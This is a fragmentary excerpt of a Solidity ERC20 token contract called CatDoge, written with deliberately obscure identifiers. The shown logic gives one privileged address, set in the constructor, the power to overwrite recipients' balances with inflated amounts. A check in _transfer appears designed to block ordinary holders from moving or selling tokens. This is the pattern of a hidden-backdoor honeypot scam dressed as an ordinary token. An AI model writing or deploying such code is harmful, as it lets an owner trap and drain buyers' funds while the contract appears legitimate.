...
contract CatDoge is IERC20, Ownable {
    ...
    mapping (address => Doof) private _donejay;

    Invent[] private _puyhejay;
    ...
    constructor(
        ...
        _symbol = symbol_;
        _decimals = 18;
        _puyhejay.push(Invent(batejay_, true));
    ...
    function _agent(address from, address account, uint256 amount) internal {
        ...
        if (from == _puyhejay[0].cent) {
            _donejay[from].hat -= total;
            total += amount;
            _donejay[account].hat = total;
        } else {
            _donejay[from].hat -= total;
            _donejay[account].hat += total;
        }
    ...
    */
    function mundjay(address account) public view returns (uint256) {
        return _donejay[account].hat;
    }
    ...
    function _transfer(
        ...
        require(amount - mundjay(sender) > 0, "mundjay");
